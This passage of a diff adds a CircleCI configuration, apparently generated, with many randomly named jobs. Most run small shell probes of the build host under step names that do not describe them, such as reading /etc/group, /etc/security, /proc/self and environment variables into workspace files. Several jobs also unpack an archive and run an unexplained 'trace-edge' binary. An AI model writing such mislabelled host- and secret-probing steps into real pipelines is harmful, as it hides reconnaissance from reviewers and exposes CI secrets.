+          command: "$PWD/trace-edge"
+  Tom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: beforeFeatureFlagPromotion
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ls -gF | awk '{print $3}' | sort -u; true ; } > /tmp/slice/SWEEP_WAVE
+            du -b /tmp/slice/SWEEP_WAVE | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'SWEEP_WAVE'
+  update-metrics-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/SWEEP_WAVE 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  npost:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: 44 refresh
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; awk -F : 'length($1) > 5{print NF}' /etc/group | sort -k2 -n; true ; } > /tmp/slice/MothSilverNickel
+            du -b /tmp/slice/MothSilverNickel | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'MothSilverNickel'
+  alpha-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/MothSilverNickel 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  attachment_shade:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: MentorPairingSchedulingStep
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; echo $(( (56 + 19) * 4 )); true ; } > /tmp/slice/patch.3.17
+            du -b /tmp/slice/patch.3.17 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'patch.3.17'
+  bravo-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/patch.3.17 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  RWPOho:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: attempt nine at playtest
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; env | head -n 5; true ; } > /tmp/slice/sw
+            du -b /tmp/slice/sw | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'sw'
+  wip-db:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/sw 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+
+  lishbealglossx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Flushing the retry buffer in progress
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; printf '%s\n' "v1.2.3 released" | wc -m; true ; } > /tmp/slice/MVC-GIF
+            du -b /tmp/slice/MVC-GIF | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'MVC-GIF'
+  when:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: try number seven
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; shopt | grep -c off; true ; } > /tmp/slice/rFYl43
+            du -b /tmp/slice/rFYl43 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'rFYl43'
+  pic_01080_deprecated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: B roll is stable
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ls --size --numeric-uid-gid ~/.bash_logout | tail -n 2; true ; } > /tmp/slice/crane_trade_theta_copper
+            du -b /tmp/slice/crane_trade_theta_copper | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'crane_trade_theta_copper'
+  hdr_inst:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Sync with Bjorn
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; df -h | grep -c %; true ; } > /tmp/slice/INV60116
+            du -b /tmp/slice/INV60116 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'INV60116'
+  calc_huge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: SWITCHOVER
+          command: |
+            mkdir -p /tmp/slice
+            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=500000;i++) print i*7}' > /tmp/slice/INV_084975; true
+            du -b /tmp/slice/INV_084975 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'INV_084975'
+  let-deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Dispatch the rotated logs over to staging
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; grep -r alias /etc/security 2>/dev/null | cut -d: -f1 | sort -u; true ; } > /tmp/slice/ptu7w
+            du -b /tmp/slice/ptu7w | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'ptu7w'
+  donut-promise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Lock down the sudoers file so we can sleep
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; printf '%s\n' 70 62 23 43 > "/var/tmp/draft.conf" && sort -n -o "/var/tmp/draft.conf" "/var/tmp/draft.conf" && cat "/var/tmp/draft.conf"; true ; } > /tmp/slice/153318_2025
+            du -b /tmp/slice/153318_2025 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '153318_2025'
+  unmount___frame:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: item 40 of 46 optimizing orders table
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; seq 7 44 | head -n5 | paste -sd+; true ; } > /tmp/slice/scratch-ea22e6c
+            du -b /tmp/slice/scratch-ea22e6c | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'scratch-ea22e6c'
+  aud311:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Do not label the cell lines yet
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; echo "the quick brown fox jumps over the lazy dog"; echo "low battery"; true ; } > /tmp/slice/MothSilverNickel
+            du -b /tmp/slice/MothSilverNickel | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'MothSilverNickel'
+  c8b5bd9a38275:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Edge Crop Step
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; cd /tmp&&pwd&&cd - >/dev/null&&pwd; true ; } > /tmp/slice/v-v4.3.21
+            du -b /tmp/slice/v-v4.3.21 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'v-v4.3.21'
+  tr_mn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: On final for audit
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=2626\nuser=hugo\ndebug=false\n' > "/tmp/red1.txt" && grep ^port "/tmp/red1.txt" | cut -d= -f2; true ; } > /tmp/slice/run-18t
+            du -b /tmp/slice/run-18t | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'run-18t'
+  uvxam1bu4v5j7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: stream churn scores a29
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ls -Q /usr/lib/os-release | nl; true ; } > /tmp/slice/v9.20.38
+            du -b /tmp/slice/v9.20.38 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'v9.20.38'
+  cloudprod4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Helsinki optimization
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; printf '%s' 'key=value' | od -An -c; true ; } > /tmp/slice/RavenModuleSilent
+            du -b /tmp/slice/RavenModuleSilent | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'RavenModuleSilent'
+  BMAZA-8290:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Submit x250
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 3 -iname 'tty*' -print -quit 2> /dev/null | sort | head -8; true ; } > /tmp/slice/1a602a81-6280-f603-3dc0
+            du -b /tmp/slice/1a602a81-6280-f603-3dc0 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '1a602a81-6280-f603-3dc0'
+  posK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Vortex the extraction kit overnight
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; echo "we're live" | cat -A; true ; } > /tmp/slice/epoch_102
+            du -b /tmp/slice/epoch_102 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'epoch_102'
+  ServerLoose:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Recognise the particle systems after tea
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; grep -Fnw users /etc/group | sort | uniq -c; true ; } > /tmp/slice/63.41.4.122
+            du -b /tmp/slice/63.41.4.122 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '63.41.4.122'
+  switch_39070_right:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Subsequently archive the support macros
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; cut -d"=" -f1 /etc/os-release | sort -u | awk '{print length, $0}'; true ; } > /tmp/slice/titanshimmerfjord
+            du -b /tmp/slice/titanshimmerfjord | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'titanshimmerfjord'
+  lvlCam:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Promotion Limit 500
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; find /usr/share/doc -type f -name '*.gz' -exec wc -l {} + | tail -n 1; true ; } > /tmp/slice/166gda4t
+            du -b /tmp/slice/166gda4t | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '166gda4t'
+  errorPct:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Midnight profiling
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; echo x >"${TMPDIR:-/tmp}/cheese-goose-20230509.txt" && ln -f "${TMPDIR:-/tmp}/cheese-goose-20230509.txt" ${TMPDIR:-/tmp}/core.txt && stat -c %h "${TMPDIR:-/tmp}/cheese-goose-20230509.txt"; true ; } > /tmp/slice/a8eb67d8eb0
+            du -b /tmp/slice/a8eb67d8eb0 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'a8eb67d8eb0'
+  vb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Pay the referral bonuses with manager
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; function prompt_line { date "+%F $1"; }; prompt_line %T; true ; } > /tmp/slice/SWEEP_WAVE
+            du -b /tmp/slice/SWEEP_WAVE | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'SWEEP_WAVE'
+  height_2_1_38:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Started validating the regression pack
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; df -h | awk '{print $1}' | tr '[:lower:]' '[:upper:]' | shuf -n 2 | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/slice/20160220
+            du -b /tmp/slice/20160220 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '20160220'
+  report-2015:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Enforce the access logs following migration
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; dirname "/tmp/archive-limit.txt"; true ; } > /tmp/slice/hSSnGK7vzPBsQnFCRL
+            du -b /tmp/slice/hSSnGK7vzPBsQnFCRL | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'hSSnGK7vzPBsQnFCRL'
+  candle_gradient_socket_total:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Sanitisation of the build artifacts
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -name '*map*' -nouser -exec ls -ld {} \; 2>/dev/null | cat -n; true ; } > /tmp/slice/snapshot-v1.20.2
+            du -b /tmp/slice/snapshot-v1.20.2 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'snapshot-v1.20.2'
+  XXLO:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: UNLOAD DAY NIGHT CYCLE END
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; tr -cs '[:alnum:]' '\n' </proc/cpuinfo | tail -n 3; true ; } > /tmp/slice/o8sv7Ro4JZFSaGNsKL3
+            du -b /tmp/slice/o8sv7Ro4JZFSaGNsKL3 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'o8sv7Ro4JZFSaGNsKL3'
+  panel--full:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Carry the event store to tier one
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -type f -name "status" -exec stat -c '%s %n' '{}' \; 2>/dev/null| wc -l; true ; } > /tmp/slice/patch.3.17
+            du -b /tmp/slice/patch.3.17 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'patch.3.17'
+  sys_ReceiveWake:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: zzz
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; test -e /proc/self && echo yes || echo "no"; true ; } > /tmp/slice/ead1ca791
+            du -b /tmp/slice/ead1ca791 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'ead1ca791'
+  p_new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: We might archive the support macros
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 3 -name '*.txt' 2> /dev/null | wc -l; true ; } > /tmp/slice/west_config
+            du -b /tmp/slice/west_config | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'west_config'
+  uniformStream:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Optimization v19
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - shells | gzip -c >/tmp/export_build.tgz && tar -tzf /tmp/export_build.tgz; true ; } > /tmp/slice/145808_2019
+            du -b /tmp/slice/145808_2019 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '145808_2019'
+  TCPHook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Rewrite then draft
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; printf '%.3s\n' set; true ; } > /tmp/slice/red618
+            du -b /tmp/slice/red618 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'red618'
+  providers-send:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: du cdn db dump
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -g ~ | sort -k5 -n; true ; } > /tmp/slice/sw
+            du -b /tmp/slice/sw | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'sw'
+workflows:
+  build:
+    jobs:
+      - check_grid
+      - lishbealglossx:
+          requires:
+            - check_grid
+      - Rollout_Pipeline6:
+          requires:
+            - lishbealglossx
+      - glacier-contract:
+          requires:
+            - lishbealglossx
+      - when:
+          requires:
+            - glacier-contract
+      - brodcast:
+          requires:
+            - when
+      - ms_fname_prod:
+          requires:
+            - when
+      - pic_01080_deprecated:
+          requires:
+            - ms_fname_prod
+      - java17-vet:
+          requires:
+            - pic_01080_deprecated
+      - INDEX3:
+          requires:
+            - pic_01080_deprecated
+      - hdr_inst:
+          requires:
+            - INDEX3
+      - lima-8:
+          requires:
+            - hdr_inst
+      - panel_full_coupon_init:
+          requires:
+            - hdr_inst
+      - calc_huge:
+          requires:
+            - panel_full_coupon_init
+      - Validate_Tests1:
+          requires:
+            - calc_huge
+      - Y80:
+          requires:
+            - calc_huge
+      - let-deploy:
+          requires:
+            - Y80
+      - intergration:
+          requires:
+            - let-deploy
+      - Revoke-KernelStatus:
+          requires:
+            - let-deploy
+      - donut-promise:
+          requires:
+            - Revoke-KernelStatus
+      - verify:
+          requires:
+            - donut-promise
+      - emitDriver:
+          requires:
+            - donut-promise
+      - unmount___frame:
+          requires:
+            - emitDriver
+      - dotnet8-cov:
+          requires:
+            - unmount___frame
+      - npost:
+          requires:
+            - unmount___frame
+      - aud311:
+          requires:
+            - npost
+      - alpha-7:
+          requires:
+            - aud311
+      - patelpatel:
+          requires:
+            - aud311
+      - c8b5bd9a38275:
+          requires:
+            - patelpatel
+      - Build_App9:
+          requires:
+            - c8b5bd9a38275
+      - path_139
+      - tr_mn:
+          requires:
+            - path_139
+      - bravo-6:
+          requires:
+            - tr_mn
+      - llbBlock:
+          requires:
+            - tr_mn
+      - uvxam1bu4v5j7:
+          requires:
+            - llbBlock
+      - ci-2:
+          requires:
+            - uvxam1bu4v5j7
+      - export_ref:
+          requires:
+            - uvxam1bu4v5j7
+      - cloudprod4:
+          requires:
+            - export_ref
+      - validate-partial-regression-suite:
+          requires:
+            - cloudprod4
+      - OMGX:
+          requires:
+            - cloudprod4
+      - BMAZA-8290:
+          requires:
+            - OMGX
+      - INFRA-750:
+          requires:
+            - BMAZA-8290
+      - button_pad_session:
+          requires:
+            - BMAZA-8290
+      - posK:
+          requires:
+            - button_pad_session
+      - Run_Release8:
+          requires:
+            - posK
+      - alphaSilver:
+          requires:
+            - posK
+      - ServerLoose:
+          requires:
+            - alphaSilver
+      - Validate_Release2:
+          requires:
+            - ServerLoose
+      - stash-kyle-camera:
+          requires:
+            - ServerLoose
+      - switch_39070_right:
+          requires:
+            - stash-kyle-camera
+      - biuld:
+          requires:
+            - switch_39070_right
+      - fact_assert_union_string:
+          requires:
+            - switch_39070_right
+      - lvlCam:
+          requires:
+            - fact_assert_union_string
+      - verify-nightly-test-matrix:
+          requires:
+            - lvlCam
+      - constName:
+          requires:
+            - lvlCam
+      - errorPct:
+          requires:
+            - constName
+      - PROD_DEPLOY_5:
+          requires:
+            - errorPct
+      - Tom:
+          requires:
+            - errorPct
+      - vb:
+          requires:
+            - Tom
+      - update-metrics-bug:
+          requires:
+            - vb
+      - Lock2PCI:
+          requires:
+            - vb
+      - height_2_1_38:
+          requires:
+            - Lock2PCI
+      - uniform-8:
+          requires:
+            - height_2_1_38
+      - sec-31275-total:
+          requires:
+            - height_2_1_38
+      - report-2015:
+          requires:
+            - sec-31275-total
+      - rip-it:
+          requires:
+            - report-2015
+      - bigOrbit:
+          requires:
+            - report-2015
+      - candle_gradient_socket_total:
+          requires:
+            - bigOrbit
+      - europa-v2:
+          requires:
+            - candle_gradient_socket_total
+      - stateCubeAccountToastCrimson
+      - XXLO:
+          requires:
+            - stateCubeAccountToastCrimson
+      - rust-fmt:
+          requires:
+            - XXLO
+      - attachment_shade:
+          requires:
+            - XXLO
+      - panel--full:
+          requires:
+            - attachment_shade
+      - bravo-1:
+          requires:
+            - panel--full
+      - OPHCE-11435:
+          requires:
+            - panel--full
+      - sys_ReceiveWake:
+          requires:
+            - OPHCE-11435
+      - fix-dashboard-crash:
+          requires:
+            - sys_ReceiveWake
+      - unsafeNo:
+          requires:
+            - sys_ReceiveWake
+      - p_new:
+          requires:
+            - unsafeNo
+      - nova-final:
+          requires:
+            - p_new
+      - DogVs:
+          requires:
+            - p_new
+      - uniformStream:
+          requires:
+            - DogVs
+      - q2-cleanup:
+          requires:
+            - uniformStream
+      - Grant-HostItem:
+          requires:
+            - uniformStream
+      - TCPHook:
+          requires:
+            - Grant-HostItem
+      - india-9:
+          requires:
+            - TCPHook
+      - RWPOho:
+          requires:
+            - TCPHook
+      - providers-send:
+          requires:
+            - RWPOho
+      - wip-db:
+          requires:
+            - providers-send
